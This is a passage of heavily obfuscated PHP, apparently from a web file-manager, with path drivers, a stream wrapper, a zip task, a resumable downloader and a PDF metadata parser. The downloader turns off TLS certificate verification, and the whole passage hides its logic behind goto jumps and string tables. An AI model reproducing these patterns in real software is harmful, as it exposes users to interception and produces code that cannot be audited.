$this->link($Bϳ܈))) { return !1; } $cÎ = 0; goto Eآ; Aࡍ: fclose($aך݈); return $E; goto bۄЭ; bۄЭ: } public function link($A˛Ȑ, $Dў = array()) { $Aڛ =& $_SERVER[ԥ]; $A˛Ȑ = trim($A˛Ȑ, $Aڛ[8]); if (!empty($this->token)) { $cŉ = strtotime(date($Aڛ[1253])); $a܉ = substr(md5($this->token . $Aڛ[268] . $cŉ . $Aڛ[1254] . $A˛Ȑ), 12, 8) . $cŉ; $Dў[] = $Aڛ[1255] . $a܉; } $E = !empty($Dў) ? $Aڛ[69] . implode($Aڛ[268], $Dў) : $Aڛ[33]; return $this->getHost() . $Aڛ[8] . $A˛Ȑ . $E; } public function fileOut($A¢, $Cڏ糡 = false, $f݅ = false, $Bڋݬ = '') { if (!$f݅) { $f݅ = $this->pathThis($A¢); } $aʄބ۔ = $Cڏ糡 ? array($_SERVER[ԥ][1256] . rawurlencode($f݅)) : array(); $C骾 = $this->link($A¢, $aʄބ۔); $this->fileOutLink($C骾); } public function fileOutServer($fʷ, $f񧤪 = false, $A̕ = false, $b = '') { parent::fileOut($fʷ, $f񧤪, $A̕, $b); } public function fileOutImage($d潛, $d = 250) { $A = $this->link($d潛 . $_SERVER[ԥ][1257] . $d); $this->fileOutLink($A); } public function fileOutImageServer($eΚ, $A݄ = 250) { parent::fileOutImage($eΚ, $A݄); } public function hashMd5($F) { $aН =& $_SERVER[ԥ]; $E = $this->objectMeta($F); return isset($E[$aН[192]]) ? $E[$aН[192]] : !1; } public function size($a) { $Bі = $this->objectMeta($a); return $Bі ? $Bі[$_SERVER[ԥ][77]] : 0; } public function info($fٜ) { if ($this->isFolder($fٜ)) { return $this->folderInfo($fٜ); } else { if ($this->isFile($fٜ)) { return $this->fileInfo($fٜ); } } return !1; } public function exist($a) { return $this->isFile($a) || $this->isFolder($a); } public function isFile($e·) { return !$this->isFolder($e·) && $this->objectMeta($e·); } public function isFolder($f) { return $this->cacheMethod($_SERVER[ԥ][219], $f); } protected function objectMeta($Aϫ) { return $this->cacheMethod($_SERVER[ԥ][220], $Aϫ); } protected function _objectMeta($c鸞) { goto B׉; f˱: $b = array($D؍[28] => get_path_this($c鸞), $D؍[29] => isset($cΌ[$D؍[1259]]) ? $cΌ[$D؍[1259]] : null, $D؍[77] => isset($cΌ[$D؍[1260]]) ? $cΌ[$D؍[1260]] : null, $D؍[192] => isset($cΌ[$D؍[1261]]) ? $cΌ[$D؍[1261]] : null, $D؍[1228] => isset($cΌ[$D؍[1262]]) ? $cΌ[$D؍[1262]] : null); $b[$D؍[1229]] = isset($cΌ[$D؍[1263]]) ? strtotime($cΌ[$D؍[1263]]) : $b[$D؍[1228]]; return $b; goto d; B׉: $D؍ =& $_SERVER[ԥ]; if ($c鸞 == $D؍[33] || $c鸞 == $D؍[8]) { return array(); } $bѳ = $this->ussRequest($c鸞, $D؍[1258]); goto fŹ; fŹ: if (!$bѳ[$D؍[1015]]) { return null; } $cΌ = isset($bѳ[$D؍[1017]]) ? $bѳ[$D؍[1017]] : array(); if (!isset($cΌ[$D؍[1259]])) { return null; } goto f˱; d: } protected function _isFolder($dÅ) { $C =& $_SERVER[ԥ]; if ($dÅ == $C[33] || $dÅ == $C[8]) { return !0; } $Dߡ = $this->objectMeta($dÅ); return isset($Dߡ[$C[29]]) && $Dߡ[$C[29]] == $C[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dӤպ = false) { } public function exist($F) { $c = $this->info($F); return $c[$_SERVER[ԥ][184]]; } public function isFile($eѨË) { $Aǈ = $this->info($eѨË); return $Aǈ[$_SERVER[ԥ][184]]; } public function isFolder($B) { return !1; } public function size($Bɾʡ) { $AՓ = $this->info($Bɾʡ); return $AՓ[$_SERVER[ԥ][77]]; } public function info($aַѴ) { return $this->infoParse($aַѴ); } public function infoAuth($bȐ) { return $this->infoParse($bȐ); } public function infoWithChildren($e˘) { return $this->infoParse($e˘); } public function infoFull($D) { return $this->infoParse($D); } private function infoParse($c枏) { $B =& $_SERVER[ԥ]; $AِΊ = $this->header($c枏); if (!$AِΊ || !$AِΊ[$B[673]]) { return !1; } $eߌՍ = _get($AِΊ, $B[321], 0); $bЃ = array($B[28] => $AِΊ[$B[28]], $B[75] => $c枏, $B[29] => $B[163], $B[77] => intval($eߌՍ), $B[156] => get_path_ext($AِΊ[$B[28]]), $B[1137] => $eߌՍ > 0 && $AِΊ[$B[1264]], $B[1138] => !1); return $bЃ; } private function header($c) { if (isset(self::$_cacheHeader[$c])) { return self::$_cacheHeader[$c]; } self::$_cacheHeader[$c] = url_header($c); return self::$_cacheHeader[$c]; } public function hashSimple($Dń, $dȏ = false) { goto Eץ؇; C䍯: $AК = $d̿Ǌ[$D[77]]; $B = 200; $C = 50; goto dϤ; E֞ү: $b .= $this->fileSubstr($Dń, $AК - $B, $B); return md5($b) . $AК; goto FĚɬ; dϤ: if ($AК <= $B * $C) { return md5($this->fileSubstr($Dń, 0, $AК)) . $AК; } $cܠ = intval($AК / $C); $b = $D[33]; goto c푽Ȅ; Eץ؇: $D =& $_SERVER[ԥ]; $d̿Ǌ = $this->info($Dń); if (!$d̿Ǌ || !$d̿Ǌ[$D[184]]) { return !1; } goto C䍯; c푽Ȅ: $F٭ = timeFloat(); $aޅ = 15; for ($A儋 = 0; $A儋 < $C; $A儋++) { if (timeFloat() - $F٭ > $aޅ) { return !1; } $bߣ = $this->fileSubstr($Dń, $cܠ * $A儋, $B); if (!$bߣ) { return !1; } $b .= $bߣ; } goto E֞ү; FĚɬ: } public function getContent($d˸) { return $this->fileSubstr($d˸); } public function fileSubstr($C, $B = 0, $Aپ = -1) { goto aٓ; aٓ: $f띆 =& $_SERVER[ԥ]; $CԜ = $this->info($C); if (!$CԜ || !$CԜ[$f띆[184]] && $CԜ[$f띆[77]] > 1024 * 1024 * 10) { return !1; } goto eԲ; C­: $bݯݑ = url_request($C, $f띆[212], !1, $cڥ, !1, !1, 1); return $bݯݑ[$f띆[1017]] ? $bݯݑ[$f띆[1017]] : $f띆[33]; goto a; eԲ: if ($Aپ === -1) { $Aپ = $CԜ[$f띆[77]]; } if ($Aپ == 0) { return $f띆[33]; } $cڥ = array($f띆[1265] . $B . $f띆[698] . ($B + $Aپ - 1)); goto C­; a: } public function download($CڐØ, $cϋ) { Downloader::start($CڐØ, $cϋ); return $cϋ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($FǕ, $b = '') { goto DϹ; DϹ: $this->info = $this->info($FǕ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ԥ][75]]; goto C; dö: return $this->info ? !0 : !1; goto Dԗ; C: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$FǕ])) { self::$_chunkBuffer[$FǕ] = array(); } goto dö; Dԗ: } function stream_read($a) { $eȍ = $this->fileSubstr($this->pose, $a); $this->pose += strlen($eȍ); return $eȍ; } public function stream_tell() { return $this->pose; } public function stream_seek($bȹĲ, $dͱÊ) { $FŶ =& $_SERVER[ԥ]; if ($dͱÊ == SEEK_SET) { $this->pose = $bȹĲ; } else { if ($dͱÊ == SEEK_CUR) { $this->pose += $bȹĲ; } else { if ($dͱÊ == SEEK_END) { $this->pose = $this->info[$FŶ[77]] + intval($bȹĲ); } } } if ($bȹĲ < 0) { $this->pose = $this->info[$FŶ[77]] + $bȹĲ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ԥ][77]]; } public function stream_close() { return !0; } public function url_stat($D, $c򇨢) { $cƉШ =& $_SERVER[ԥ]; $Aڋ = $this->info($D); return array($cƉШ[1266] => 0, $cƉШ[1267] => 0, $cƉШ[12] => 32768 + 511, $cƉШ[1268] => 0, $cƉШ[1269] => 0, $cƉШ[1270] => 0, $cƉШ[1271] => 0, $cƉШ[77] => $Aڋ[$cƉШ[77]], $cƉШ[1272] => $Aڋ[$cƉШ[1143]], $cƉШ[1229] => $Aڋ[$cƉШ[106]], $cƉШ[1228] => $Aڋ[$cƉШ[183]], $cƉШ[1273] => 0, $cƉШ[1274] => 0); } static $fileInfo = array(); public function info($Aݱ) { $D˷欃 = $_SERVER[ԥ][1275]; if (isset(self::$fileInfo[$Aݱ])) { return self::$fileInfo[$Aݱ]; } if (substr($Aݱ, 0, strlen($D˷欃)) != $D˷欃) { return !1; } self::$fileInfo[$Aݱ] = IO::info(substr($Aݱ, strlen($D˷欃))); return self::$fileInfo[$Aݱ]; } public static function read($e݌ɓ, $fƶک޿, $bه) { goto cɩ; F͌: $Bٷ = 0; while ($Bٷ < $bه) { $aȌ = min($aԯ, $bه - $Bٷ); $dۻ .= fread($A׏̼, $aȌ); $Bٷ += $aȌ; } fclose($A׏̼); goto fŖ; fŖ: return $dۻ; goto CƎ; f: $aԯ = 8192; fseek($A׏̼, $fƶک޿, SEEK_SET); $dۻ = $F[33]; goto F͌; cɩ: $F =& $_SERVER[ԥ]; $A׏̼ = fopen($e݌ɓ, $F[1145]); if (!$A׏̼) { return $F[33]; } goto f; CƎ: } public function fileSubstr($c, $bЫ÷) { goto cԑ; E: foreach ($cܞ as $Aꑢ => $a) { $Aꑢ = intval($Aꑢ); $bȫ = $Aꑢ + strlen($a); if ($c >= $bȫ) { continue; } if ($c >= $Aꑢ && $c + $bЫ÷ <= $bȫ) { return substr($a, $c - $Aꑢ, $bЫ÷); } break; } if (count($cܞ) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($DЮ[1276], $DЮ[1277] . count($cܞ) . "\73\x73\x74\141\162\164\75{$c}\54\154\x65\x6e\147\164\150\x3d{$bЫ÷}\73\x70\157\163\x65\72{$Aꑢ}\x7e{$bȫ}"); throw new Exception($DЮ[1278]); } $c = intval($c / $Bٳ) * $Bٳ; goto FØƨ; CϠ٫: $Aꑢ = 0; $bȫ = 0; $a = $DЮ[33]; goto E; D: $Bٳ = 64 * 1024; $cܞ =& self::$_chunkBuffer[$this->path]; if (!$cܞ) { $cܞ = array(); } goto CϠ٫; CĽ: if ($c + $bЫ÷ > $Bΐ) { $bЫ÷ = $Bΐ - $c; } if ($bЫ÷ <= 0) { return $DЮ[33]; } if ($c < 0 || $c >= $Bΐ || $bЫ÷ <= 0 || $bЫ÷ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\106\151\154\x65\122\x65\x61\144\40\x65\162\x72\x6f\x72\x21\40\163\x74\141\x72\164\75{$c}\x3b\154\x65\x6e\147\164\x68\75{$bЫ÷}\73\x20\x73\x69\x7a\x65\75{$Bΐ}\x3b"); } goto D; FØƨ: $BϞܡ = ceil(($c + $bЫ÷) / $Bٳ) * $Bٳ - $c; $Bا = IO::fileSubstr($this->path, $c, $BϞܡ); $cܞ[$c . $DЮ[33]] = $Bا; goto f՞䋽; c푧: $D = $bЫ÷; if ($c < 0) { $c = $Bΐ + $c; } if ($bЫ÷ === !1) { $bЫ÷ = $Bΐ - $c; } goto CĽ; f՞䋽: ksort($cܞ); $Eڤ = substr($Bا, $c - $c, $bЫ÷); return $Eڤ; goto F; cԑ: $DЮ =& $_SERVER[ԥ]; $Bΐ = $this->info[$DЮ[77]]; $c = $c; goto c푧; F: } private function log($F뽗, $C) { $dА =& $_SERVER[ԥ]; $b = timeFloat() - $this->timeStart; write_log(sprintf($dА[1279], $F뽗, $this->info[$dА[28]], $b, $C), $dА[1194]); } } goto eԥĸ; E: class TaskZip extends TaskFileTransfer { protected function startAfter() { $B요ص =& $_SERVER[ԥ]; parent::startAfter(); Hook::bind($B요ص[1475], array($this, $B요ص[1470])); $EЌ =& $this->task; $EЌ[$B요ص[1472]] = $B요ص[1023]; if (!$EЌ[$B요ص[1312]]) { $EЌ[$B요ص[1312]] = LNG($B요ص[1476]); } } protected function endAfter() { $Fϒ֓ =& $_SERVER[ԥ]; parent::endAfter(); Hook::unbind($Fϒ֓[1475], array($this, $Fϒ֓[1470])); } public function updateAfter() { $D򛥏 =& $_SERVER[ԥ]; $A𭂲 =& $this->task; if (!$A𭂲[$D򛥏[961]] || !$A𭂲[$D򛥏[682]]) { return; } if ($A𭂲[$D򛥏[1472]] == $D򛥏[1023]) { $CՊ = $A𭂲[$D򛥏[1450]]; if ($A𭂲[$D򛥏[1451]] != $D򛥏[1023]) { $CՊ = 0; } $aӝ = ($A𭂲[$D򛥏[1454]] + $CՊ) / $A𭂲[$D򛥏[682]]; $A𭂲[$D򛥏[1405]] = $aӝ * 0.3; } else { if ($A𭂲[$D򛥏[1472]] == $D򛥏[297]) { $aӝ = $A𭂲[$D򛥏[973]] / $A𭂲[$D򛥏[961]]; $A𭂲[$D򛥏[1405]] = 0.3 + $aӝ * 0.5; } else { if ($A𭂲[$D򛥏[1472]] == $D򛥏[102]) { $aӝ = 0; if ($A𭂲[$D򛥏[1449]]) { $aӝ = $A𭂲[$D򛥏[1450]] / $A𭂲[$D򛥏[1449]]; } $A𭂲[$D򛥏[1405]] = 0.3 + 0.5 + $aӝ * 0.2; } } } if ($A𭂲[$D򛥏[1405]] > 0) { $bϏ = timeFloat() - $A𭂲[$D򛥏[1407]] - $A𭂲[$D򛥏[1410]]; $A𭂲[$D򛥏[1411]] = $bϏ * (1 - $A𭂲[$D򛥏[1405]]) / $A𭂲[$D򛥏[1405]]; } } public function copyFileStart($C눴, $F, $fР, $e, $e, $E) { $cě =& $_SERVER[ԥ]; parent::copyFileStart($C눴, $F, $fР, $e, $e, $E); $Cሏ =& $this->task; if ($Cሏ[$cě[1472]] == $cě[297]) { $Cሏ[$cě[1472]] = $cě[102]; } $this->update(); } public function copyFileEnd($c̍ۂ, $Fٴ, $bߙ, $e, $C؛, $Aڛ) { $B窽 =& $_SERVER[ԥ]; $a =& $this->task; $a[$B窽[1450]] = $a[$B窽[1449]]; $a[$B窽[1454]] += $a[$B窽[1449]]; $a[$B窽[1451]] = $B窽[33]; $this->update(); } public function nameParse($Fɭ) { $Bܷ =& $_SERVER[ԥ]; $D̥ =& $this->task; if ($D̥[$Bܷ[973]] < $D̥[$Bܷ[961]]) { $C֩ = get_path_this($Fɭ); if (strstr($C֩, $Bܷ[91])) { $D̥[$Bܷ[973]] += 1; } } if ($D̥[$Bܷ[1472]] == $Bܷ[1023]) { $D̥[$Bܷ[1472]] = $Bܷ[297]; } $D̥[$Bܷ[1447]] = $Fɭ; $this->update(); } } class Downloader { static function start($a썎, $D꧚, $a޽ = 10) { goto eއ; E: $aݛܯڐ = $D꧚ . $Bԏ[1478]; if (is_array($a썎)) { $B = $a썎; } else { $B = url_header($a썎); } $a썎 = $B[$Bԏ[291]]; goto cœ; cɘ: $C = intval($B[$Bԏ[321]]); if (file_exists($aݛܯڐ) && time() - filemtime($aݛܯڐ) < 3) { return array($Bԏ[1015] => !1, $Bԏ[1017] => $Bԏ[1479]); } $D = array(); goto fӊ; fӊ: if (is_file($b۶)) { $CҨ҉֟ = file_get_contents($b۶); $D = json_decode($CҨ҉֟, 1); } if (file_exists($D꧚) && $C == filesize($D꧚)) { @unlink($aݛܯڐ); @unlink($b۶); return array($Bԏ[1015] => !0, $Bԏ[1017] => $Bԏ[1480]); } if ($D[$Bԏ[321]] != $C) { $D = array($Bԏ[321] => $C); } goto d; cœ: if (!$a썎) { return array($Bԏ[1015] => !1, $Bԏ[1017] => $Bԏ[1020]); } if (!$B[$Bԏ[1264]] || $B[$Bԏ[321]] == 0) { @unlink($aݛܯڐ); @unlink($D꧚); $BȰ = self::fileDownloadFopen($a썎, $D꧚, $B[$Bԏ[321]]); if ($BȰ[$Bԏ[1015]]) { return $BȰ; } else { @unlink($aݛܯڐ); @unlink($D꧚); $BȰ = self::fileDownloadCurl($a썎, $D꧚, !1, 0, $B[$Bԏ[321]]); @unlink($aݛܯڐ); return $BȰ; } } $aω = is_file($aݛܯڐ) ? filesize($aݛܯڐ) : 0; goto cɘ; d: if ($aω > $C) { @unlink($aݛܯڐ); } file_put_contents($b۶, json_encode($D)); $BȰ = self::fileDownloadCurl($a썎, $D꧚, !0, $aω, $C); goto c❬; c❬: if ($BȰ[$Bԏ[1015]]) { @unlink($b۶); } return $BȰ; goto F; eއ: $Bԏ =& $_SERVER[ԥ]; if (!request_url_safe($a썎)) { return array($Bԏ[1015] => !1, $Bԏ[1017] => $Bԏ[1020]); } $b۶ = $D꧚ . $Bԏ[1477]; goto E; F: } static function fileDownloadFopen($A㕑, $aܲ, $b堅 = 0) { $e =& $_SERVER[ԥ]; @ini_set($e[1481], $e[1482]); $dڪ = $aܲ . $e[1478]; set_timeout(); @unlink($dڪ); if ($cڙ = @fopen($A㕑, $e[1483])) { goto Aǋ; eї: return array($e[1015] => !0, $e[1017] => $e[680]); goto AĶ; Aǋ: if (!($CӞ = @fopen($dڪ, $e[1484]))) { return array($e[1015] => !1, $e[1017] => $e[1485]); } while (!feof($cڙ)) { if (!file_exists($dڪ)) { fclose($CӞ); return array($e[1015] => !1, $e[1017] => $e[1486]); } clearstatcache(); if ($b堅 > 0 && $b堅 == filesize(iconv_system($dڪ))) { break; } fwrite($CӞ, fread($cڙ, 1024 * 8), 1024 * 8); } fclose($CӞ); goto Dۂ; Dۂ: fclose($cڙ); self::checkGzip($dڪ); if (!@rename($dڪ, $aܲ)) { usleep(round(rand(0, 1000) * 50)); @unlink($aܲ); $E阊 = @rename($dڪ, $aܲ); if (!$E阊) { return array($e[1015] => !1, $e[1017] => $e[1487]); } } goto eї; AĶ: } else { return array($e[1015] => !1, $e[1017] => $e[1488]); } } static function fileDownloadCurl($E, $C, $fŋǱ = false, $dܷ = 0, $fƓ = 0) { goto D㿭; D㿭: $aɍ =& $_SERVER[ԥ]; $B = $C . $aɍ[1478]; set_timeout(); goto C򬳹; AɈح: curl_close($cʣ); fclose($F); $Fͯ發 = filesize(iconv_system($B)); goto c; FƖ: if ($fŋǱ) { curl_setopt($cʣ, CURLOPT_RANGE, $dܷ . $aɍ[698]); } curl_setopt($cʣ, CURLOPT_FILE, $F); curl_setopt($cʣ, CURLOPT_REFERER, get_url_link($E)); goto eޢ﵇; c: if ($Fͯ發 < $fƓ && $fƓ != 0) { return array($aɍ[1015] => !1, $aɍ[1017] => $aɍ[1479]); } if ($FԂĵ && filesize($B) != 0) { self::checkGzip($B); if (!@rename($B, $C)) { @unlink($C); $FԂĵ = @rename($B, $C); if (!$FԂĵ) { return array($aɍ[1015] => !1, $aɍ[1017] => $aɍ[1491]); } } return array($aɍ[1015] => !0, $aɍ[1017] => $aɍ[680]); } return array($aɍ[1015] => !1, $aɍ[1017] => $aɍ[1492]); goto A; eޢ﵇: curl_setopt($cʣ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($cʣ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($cʣ, CURLOPT_SSL_VERIFYHOST, 0); goto D܊ڑ; D܊ڑ: curl_setopt($cʣ, CURLOPT_NOPROGRESS, !1); curl_setopt($cʣ, CURLOPT_PROGRESSFUNCTION, $aɍ[1490]); curl_progress_start($cʣ); goto C藒; C藒: curl_setopt($cʣ, CURLOPT_USERAGENT, $aɍ[1482]); $FԂĵ = curl_exec($cʣ); curl_progress_end($cʣ); goto AɈح; C򬳹: $F = @fopen($B, $aɍ[965]); if (!$F) { return array($aɍ[1015] => !1, $aɍ[1017] => $aɍ[1489]); } $cʣ = curl_init($E); goto FƖ; A: } static function checkGzip($F) { goto e毺; e毺: $Aڳ = $_SERVER[ԥ][1493]; $d깽 = file_sub_str($F, 0, 2); if ($Aڳ != $d깽) { return; } goto E; Aä: file_put_contents($F, $Aՙʗ); goto CǾ; E: ob_start(); readgzfile($F); $Aՙʗ = ob_get_clean(); goto Aä; CǾ: } } class FileParsePdf { public static function parse($Bŉ) { goto Aア; f݉޲: if ($A) { $D = $A[$B[1497]][$B[1167]]; $a␻ = self::getObjectValue($E, $A, $D); } $a␻ = is_array($a␻) ? $a␻ : array(); $a␻[$B[1498]] = 0; goto E; E: $cϋ޶ = $B[1499]; preg_match($cϋ޶, $E[$B[1495]], $d); if (!$a␻[$B[1498]] && count($d) == 5) { $a␻[$B[1498]] = $d[3]; $a␻[$B[1500]] = $d[4]; } goto Cɿ; Aア: $B =& $_SERVER[ԥ]; $Dȅ = 32 * 1024; $E = array($B[767] => fopen($Bŉ, $B[1145]), $B[75] => $Bŉ, $B[77] => filesize($Bŉ), $B[1494] => $Dȅ); goto cÌ۸; C: if ($d) { $a␻[$B[1311]] = $d[1]; } $a␻[$B[1502]] = 0; $cϋ޶ = $B[1503]; goto aݵ; aݵ: preg_match_all($cϋ޶, $E[$B[1495]], $d); if ($d[1] && $a␻[$B[1502]] < $d[1][0]) { $a␻[$B[1502]] = $d[1][0]; } preg_match_all($cϋ޶, $E[$B[1496]], $d); goto e܄߸; cÌ۸: $E[$B[1495]] = StreamWrapperIO::read($Bŉ, 0, $Dȅ); $E[$B[1496]] = StreamWrapperIO::read($Bŉ, $E[$B[77]] - $Dȅ, $Dȅ); $A = self::decodeXref($E); goto f݉޲; Cɿ: preg_match($cϋ޶, $E[$B[1496]], $d); if (!$a␻[$B[1498]] && count($d) == 5) { $a␻[$B[1498]] = $d[3]; $a␻[$B[1500]] = $d[4]; } preg_match($B[1501], $E[$B[1495]], $d); goto C; e܄߸: if ($d[1] && $a␻[$B[1502]] < $d[1][0]) { $a␻[$B[1502]] = $d[1][0]; } $a␻ = self::parseInfoItem($a␻); return $a␻; goto f; f: } private static function parseInfoItem($FĲ⢣) { $b =& $_SERVER[ԥ]; if (!$FĲ⢣) { return !1; } $Dű = array($b[1312] => array($b[1504], $b[33]), $b[1505] => array($b[1506], $b[33]), $b[183] => array($b[1507], $b[206]), $b[106] => array($b[1508], $b[206]), $b[1502] => array($b[1502], $b[272]), $b[1498] => array($b[1498], $b[272]), $b[1500] => array($b[1500], $b[272]), $b[1509] => array($b[1510], $b[33]), $b[1511] => array($b[1512], $b[33]), $b[1513] => array($b[1311], $b[33])); $A센 = array(); foreach ($Dű as $Aԉ => $bך) { if (!isset($FĲ⢣[$bך[0]])) { continue; } $AѸ眏 = $FĲ⢣[$bך[0]]; if (!$AѸ眏 || is_array($AѸ眏)) { continue; } switch ($bך[1]) { case $b[272]: $AѸ眏 = intval($AѸ眏); break; case $b[206]: if (substr($AѸ眏, 0, 2) == $b[1514]) { $AѸ眏 = substr($AѸ眏, 2, 14); } if (strtotime($AѸ眏)) { $AѸ眏 = date($b[1515], strtotime($AѸ眏)); } break; } $A센[$Aԉ] = $AѸ眏; } return $A센; } private static function decodeXref(&$e) { goto cِ; bݷ: $E = $cݠ[1517]; if (!preg_match_all($E, $C飪, $Cԙ, PREG_SET_ORDER, 0)) { return !1; } $D = intval($Cԙ[0][1]); goto b; cِ: $cݠ =& $_SERVER[ԥ]; $C飪 = $e[$cݠ[1496]]; $E΢ = array($cݠ[1497] => array(), $cݠ[1516] => array()); goto bݷ; d: if (preg_match($cݠ[1530], $aŭ, $Cԙ) > 0) { } return $E΢; goto Cھ; fஈ: if (preg_match($cݠ[1528], $aŭ, $Cԙ) > 0) { $E΢[$cݠ[1497]][$cݠ[1167]] = intval($Cԙ[1]) . $cݠ[70] . intval($Cԙ[2]); } if (preg_match($cݠ[1529], $aŭ, $Cԙ) > 0) { $E΢[$cݠ[1497]][$cݠ[363]] = array(); $E΢[$cݠ[1497]][$cݠ[363]][0] = $Cԙ[1]; $E΢[$cݠ[1497]][$cݠ[363]][1] = $Cԙ[2]; } if (!$E΢[$cݠ[1497]][$cݠ[1167]]) { return !1; } goto d; E: foreach ($Cԙ[3] as $d٠ => $b) { if ($Cԙ[3][$d٠] == $cݠ[1519]) { $eӆ = $b툩߆ . $cݠ[70] . intval($Cԙ[2][$d٠]); $E΢[$cݠ[1516]][$eӆ] = intval($Cԙ[1][$d٠]); ++$b툩߆; } else { if ($Cԙ[3][$d٠] == $cݠ[1520]) { ++$b툩߆; } else { } } } if (preg_match_all($cݠ[1521], $C飪, $Cԙ)) { $cȷ = $e[$cݠ[77]] - $e[$cݠ[1494]]; foreach ($Cԙ[0] as $d٠ => $fٵ) { $C܇ = $Cԙ[1][$d٠] . $cݠ[70] . $Cԙ[2][$d٠]; $E΢[$cݠ[1516]][$C܇] = strpos($C飪, $fٵ) + $cȷ + 1; } } if (preg_match_all($cݠ[1522], $C飪, $Cԙ)) { $aŭ = count($Cԙ[1]) == 1 ? $Cԙ[1][0] : $Cԙ[1][1]; } else { $aŭ = substr($C飪, -1024 * 5); } goto F; b: if ($e[$cݠ[77]] - $D > $e[$cݠ[1494]]) { $eբՓ = 4 * $e[$cݠ[1494]]; $e[$cݠ[1494]] = $eբՓ; $e[$cݠ[1495]] = StreamWrapperIO::read($e[$cݠ[75]], 0, $eբՓ); $e[$cݠ[1496]] = StreamWrapperIO::read($e[$cݠ[75]], $e[$cݠ[77]] - $eբՓ, $eբՓ); $C飪 = $e[$cݠ[1496]]; } $b툩߆ = 0; preg_match_all($cݠ[1518], $C飪, $Cԙ); goto E; F: if (preg_match($cݠ[1523], $aŭ, $Cԙ) > 0) { $E΢[$cݠ[1497]][$cݠ[77]] = intval($Cԙ[1]); } if (preg_match($cݠ[1524], $aŭ, $Cԙ) > 0) { $E΢[$cݠ[1497]][$cݠ[1525]] = intval($Cԙ[1]) . $cݠ[70] . intval($Cԙ[2]); } if (preg_match($cݠ[1526], $aŭ, $Cԙ) > 0) { $E΢[$cݠ[1497]][$cݠ[1527]] = intval($Cԙ[1]) . $cݠ[70] . intval($Cԙ[2]); } goto fஈ; Cھ: } private static function getObjectValue($dڍͲ, $fÉٸ, $d騌) { goto E؇; E؇: $FާҨ =& $_SERVER[ԥ]; $B缑 = self::getObject($dڍͲ, $fÉٸ[$FާҨ[1516]][$d騌]); if (is_string($B缑[1])) { return $B缑[1]; } goto fТ; fТ: if (!is_array($B缑[1])) { return array(); } $DӾ = array(); for ($D = 0; $D < count($B缑[1]); $D += 2) { $DˬƬ = $B缑[1][$D]; $e = $B缑[1][$D + 1]; if (count($DˬƬ) == 3 && $DˬƬ[0] == $FާҨ[8]) { $Aĵ = !1; if ($e[0] == $FާҨ[1531]) { $e = self::getObject($dڍͲ, $fÉٸ[$FާҨ[1516]][$e[1]]); } $Aĵ = $e[1]; if ($Aĵ === !1) { continue; } if (is_string($Aĵ)) { $Aĵ = self::decodeStr($Aĵ); } $DӾ[$DˬƬ[1]] = $Aĵ; } } goto Fڌ; Fڌ: return $DӾ; goto eՎĤ; eՎĤ: } private static function getObject($D, $Aز) { $F = self::getObjectItem($D, $Aز); $F = self::getObjectItem($D, $F[2]); return $F; } private static function getObjectItem($A﵂ʢ, $aҩ) { goto Cى; B˗: $Cݲ܍ = self::getRawObject($e, $A픈Ɗ); if ($aҩ >= $eҕ) { $Cݲ܍[2] = $Cݲ܍[2] + $eҕ; } else { if ($aҩ > $Aߐ && $aҩ <= $eҕ) { $Cݲ܍[2] = $Cݲ܍[2] + $aҩ; } } return $Cݲ܍; goto Cޅ; f̎: $A픈Ɗ = $aҩ >= $eҕ ? $aҩ - $eҕ : $aҩ; $e = $aҩ >= $eҕ ? $A﵂ʢ[$cܪ[1496]] : $A﵂ʢ[$cܪ[1495]]; if ($aҩ > $Aߐ && $aҩ <= $eҕ) { $A픈Ɗ = 0; $e = StreamWrapperIO::read($A﵂ʢ[$cܪ[75]], $aҩ, $Aߐ); } goto B˗; Cى: $cܪ =& $_SERVER[ԥ]; $Aߐ = $A﵂ʢ[$cܪ[1494]]; $eҕ = $A﵂ʢ[$cܪ[77]] - $Aߐ; goto f̎; Cޅ: } private static function decodeStr($Bքڜ) { goto B˼߱; f: $Bքڜ = $eͬ[33]; foreach ($D as $eޢ) { if (preg_match($eͬ[1546], $eޢ) && !1 === stripos($eޢ, $eͬ[1547])) { $eޢ = preg_replace($eͬ[1548], $eͬ[33], $eޢ); $eޢ = trim($eޢ, $eͬ[911]); $eޢ = pack($eͬ[1549], $eޢ); $Bքڜ .= $eޢ; } else { $Bքڜ .= $eޢ; } } if (preg_match($eͬ[1550], $Bքڜ)) { $E = substr($Bքڜ, 2); $Bքڜ = $eͬ[33]; $Aԏɘ = strlen($E); for ($D帊 = 0; $D帊 < $Aԏɘ; $D帊 += 2) { $aי = hexdec(bin2hex(substr($E, $D帊, 2))); $Bքڜ .= mb_convert_encoding($eͬ[1551] . intval($aי) . $eͬ[67], $eͬ[1552], $eͬ[1553]); } } goto E㱜ŵٴ; B˼߱: $eͬ =& $_SERVER[ԥ]; $Bքڜ = str_replace(array($eͬ[1532], $eͬ[1533], $eͬ[1534], $eͬ[1535], $eͬ[1536], $eͬ[1537], $eͬ[1538], $eͬ[1539]), array($eͬ[93], $eͬ[50], $eͬ[8], $eͬ[244], $eͬ[802], $eͬ[213], $eͬ[975], $eͬ[326]), $Bքڜ); $D = preg_split($eͬ[1540], $Bքڜ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CΟ; CΟ: $Bքڜ = $eͬ[33]; foreach ($D as $eޢ) { if (preg_match($eͬ[1541], $eޢ)) { $Bքڜ .= \chr(octdec(trim($eޢ, $eͬ[93]))); } else { $Bքڜ .= $eޢ; } } $D = preg_split($eͬ[1542], $Bքڜ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Cҟ; Cҟ: $Bքڜ = $eͬ[33]; foreach ($D as $eޢ) { if (preg_match($eͬ[1543], $eޢ)) { $Bքڜ .= \chr(hexdec(trim($eޢ, $eͬ[1544]))); } else { $Bքڜ .= $eޢ; } } $D = preg_split($eͬ[1545], $Bքڜ, -1, 